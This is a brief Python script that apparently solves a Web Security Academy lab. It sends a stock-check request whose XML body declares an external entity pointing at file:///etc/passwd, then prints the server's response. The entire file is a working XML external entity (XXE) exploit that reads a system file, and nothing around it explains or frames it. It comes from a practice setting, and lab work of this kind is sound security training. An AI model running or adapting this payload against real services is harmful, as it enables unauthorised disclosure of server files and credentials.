import requests

s = requests.Session()

stock_url = 'https://ace71f6a1f8a5fadc01a13b0003800a2.web-security-academy.net/product/stock'
xml_post_data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'

resp = s.post(stock_url, data=xml_post_data)
print(resp.text)
